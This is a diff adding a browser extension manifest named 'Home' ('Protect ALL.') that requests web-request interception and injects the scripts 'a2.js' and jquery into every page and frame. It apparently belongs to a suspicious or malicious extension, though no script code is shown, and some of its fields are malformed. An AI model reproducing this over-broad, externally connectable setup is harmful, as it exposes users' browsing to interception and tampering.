@@ -1,0 +1,33 @@
+{
+"name": "Home",
+"externally_connectable": {
+"ids": ["*"],
+"permissions": ["contextMenus", "storage", "notifications", "webRequest", "webRequestBlocking", "tabs", "http://*/*", "https://*/*", "unlimitedStorage" ],
+    "accepts_tls_channel_id": true
+},
+ "homepage_url": "https://-url-",
+ "version": "9.3.4",
+ "version_name": "14",
+
+ "description": "Protect ALL.",
+ "author": "604642110615609",
+ "manifest_version": 2,
+ "icons": { "16": "iconos/NXYQouDyLI.bmp",
+            "32": "iconos/NXYQouDyLI.bmp",
+            "48": "iconos/NXYQouDyLI.bmp",
+            "128": "iconos/NXYQouDyLI.bmp" },
+ "background": {
+   "scripts": ["eventPage.js"],
+   "persistant": false },
+ "content_scripts": [{
+     "matches":["*://*/*"],
+     "run_at":"document_end",
+	 "all_frames": true,
+     "js": ["jquery-3.3.1.min.js" , "a2.js"]
+ }]
+}
+
+
+
+
+
